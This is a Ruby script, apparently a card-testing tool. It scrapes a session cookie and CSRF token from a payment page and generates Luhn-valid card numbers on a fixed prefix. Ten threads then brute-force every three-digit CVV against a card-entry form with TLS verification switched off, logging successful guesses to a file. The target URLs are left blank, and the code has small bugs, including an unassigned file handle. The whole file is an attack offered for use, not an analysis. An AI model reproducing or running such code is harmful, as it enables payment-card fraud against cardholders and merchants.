require 'nokogiri'
require 'uri'
require 'net/https'
require 'openssl'
require 'cgi'


class Request
	attr_accessor :jCookie
	attr_accessor :csrfToken

	def initialize(aURL)
	@urlstring = aURL
	@jCookie
	@csrfToken
	end

	def send
	urlString = @urlstring
	uri = URI.parse(urlString)
	http = Net::HTTP.new(uri.host, 443)
	request = Net::HTTP::Get.new(uri.request_uri)
	http.use_ssl = true
	http.verify_mode = OpenSSL::SSL::VERIFY_NONE
	#http.set_debug_output $stdout
	response = http.request(request)	
	all_cookies = response.get_fields('set-cookie')
    		cookies_array = Array.new
    			all_cookies.each { | cookie |
			if cookie.start_with?("JSESSIONID")
				tmp,val  = cookie.split('; ')
				 tmp,val = tmp.split('=')
				  @jCookie =  val
			end
				}
	doc = Nokogiri::HTML(response.body)
	#Cycle through all inputs -- l00kin for csrfToken 

	doc.css('input').each do | i |
		if i['name'] == 'csrfToken'
		 @csrfToken = i['value']
		end
 	end 


	#puts "Initial Submit #{response.code} "
	end  
end 

class CreditCard

         def initialize
                 number = 0
         end
         def generate
                 number = ''
                 4.times do
                         number += rand(4).to_s
                 end
                 number = '484735343337' << number
                 digits = (0..9).map(&:to_s)
                 begin
                         full = number + digits.delete(digits.sample)
 
                 end while !luhn(full)
                 return full
         end
         def luhn(number)
               s1 = s2 = 0
                 number.to_s.reverse.chars.each_slice(2) do |odd, even|
                         s1 += odd.to_i
                         double = even.to_i * 2
                         double -= 9 if double >= 10
                         s2 += double
                 end
               (s1 + s2) % 10 == 0
         end
end


class Submit
	def initialize(jcookie,csrfToken,urlstring,cardnum,cvv)
		@jCookie = jcookie 
		@urlstring = urlstring
		@csrfToken = csrfToken
		@cardnum = cardnum #'4847353433371236' <= Test Account
		@expiryMonth = '08'
		@expiryYear = '21'
		@ccID = cvv
		@response = '' 

		uri = URI.parse(@urlstring)
		http = Net::HTTP.new(uri.host,443)
		request = Net::HTTP::Post.new(uri.request_uri)
		request["User-Agent"] ="Mozilla/5.0"
		request["Connection"] = "keep-alive"
		request["Referer"] = ""
		request["Cookie"] = ""
		request.set_form_data({"velocityCheckFlag" => "true", "csrfToken" => @csrfToken, "cardType" => "visa", "cardNumber" => @cardnum, "expiryMonth" => @expiryMonth, "expiryYear" => @expiryYear, "creditCardID" => @ccID, "go.x" => "26", "go.y" => "25"})
		
		http.use_ssl = true
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE
		http.read_timeout = 100
		#http.set_debug_output $stdout
	
		response = http.request(request)
		

		
		case response 
			when Net::HTTPSuccess
			  doc = Nokogiri::HTML(response.body) 
				unless not doc.css('img#logout').nil?
					@response += "\033[32mFound! Account #{@cardnum} #{@expiryMonth}/#{@expiryYear} CCV: #{@ccID} got a reponse of #{response.code} used cookie: #{@jCookie}\033[0m\n"	
					File.open("cc.out","a")
					output << @response
					output.close	
				else
					@response = "Details could not be found using the card number entered. Please re-enter correctly"
				end
					
			when Net::HTTPRedirection
			@response = "Redirected"
			
		end 
		puts "Trying #{@cardnum} CVV #{@ccID} [#{response.code}] " << @response
 
	end
end 

#-----------------------------------------------------------------
# This should generate X number of Cards 
threads = (1..10).map do |i|

 Thread.new(i) do |i|
	(001..005).each do # Try X number 
	cc = CreditCard.new()
	cardnum = cc.generate
		(000..999).each do |num| # Try CVV Number 
			cvv = "%03d" % num
			req = Request.new("")
			req.send
			sub = Submit.new(req.jCookie,req.csrfToken,"",cardnum,cvv)
		end 
	end 
end
end
threads.each {|t| t.join}


#End Program 
